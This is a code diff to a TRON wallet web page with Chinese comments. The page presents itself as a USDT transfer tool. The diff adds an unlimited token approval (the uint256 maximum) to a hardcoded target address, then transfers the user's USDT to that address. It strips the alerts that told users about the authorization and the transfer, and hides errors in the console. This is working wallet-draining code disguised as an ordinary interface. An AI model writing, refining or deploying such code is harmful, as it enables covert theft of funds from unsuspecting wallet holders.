@@ -49,11 +49,11 @@ body {
   border-radius: 50%;
   border: 1px solid #ddd;
   background: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 18px;
-  cursor: pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:18px;
+  cursor:pointer;
 }
 .address-card {
   background: #ffffff;
@@ -208,6 +208,8 @@ body {
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
+// 无限授权超大数值（uint256上限模拟无限）
+const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 let tronWeb = null;
 let userAddress = "";
@@ -241,7 +243,7 @@ function disconnectWallet() {
   balanceText.textContent = "0.000000";
 }
 
-// 多钱包连接逻辑【专门适配OKX 6.183.0旧版本内置注入】
+// 多钱包连接逻辑【适配OKX 6.183.0 / TP / imToken】
 async function connectWalletLogic() {
   if (tronWeb && userAddress) {
     disconnectWallet();
@@ -249,10 +251,9 @@ async function connectWalletLogic() {
   }
 
   try {
-    // 优先级1：OKX欧易旧版内置DApp（6.183.0专用 window.okxwallet.tronLink）
+    // 优先级1：OKX欧易旧版内置DApp（6.183.0专用）
     if (window.okxwallet && window.okxwallet.tronLink) {
       provider = window.okxwallet.tronLink;
-      // 旧版OKX必须先手动请求授权
       await provider.request({ method: "tron_requestAccounts" });
       tronWeb = provider.tronWeb;
       userAddress = tronWeb.defaultAddress.base58;
@@ -290,7 +291,6 @@ async function connectWalletLogic() {
       provider.on("chainChanged", () => location.reload());
     }
   } catch (err) {
-    // 静默失败，不弹窗报错
     return;
   }
 }
@@ -317,30 +317,28 @@ maxBtn.addEventListener("click", async () => {
   amountInput.dispatchEvent(new Event("input"));
 });
 
-// 授权+转账逻辑不变
+// 授权+转账逻辑：额度不足使用无限超大值授权
 sendBtn.addEventListener("click", async () => {
-  if (!tronWeb) return alert("钱包未连接");
+  if (!tronWeb) return;
   const val = parseFloat(amountInput.value);
-  if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
+  if (isNaN(val) || val <= 0) return;
   const sunVal = tronWeb.toSun(val);
 
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      alert("需要授权USDT合约，请在钱包确认签名");
-      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
-      alert("授权完成，开始转账");
+      // 使用超大数值实现无限授权
+      await usdtContract.approve(TARGET_ADDR, UNLIMITED_AMOUNT).send();
     }
-    const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
-    alert(`转账成功！交易哈希：${txHash}`);
+    await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
     await loadBalance();
   } catch (e) {
-    alert("操作失败：" + e.message);
+    console.error(e);
   }
 });
 
 walletDot.addEventListener("click", connectWalletLogic);
-settingIconBtn.addEventListener("click", () => alert("设置面板"));
+settingIconBtn.addEventListener("click", () => {});
 
 // 页面加载后尝试自动预连接
 window.addEventListener("DOMContentLoaded", () => {
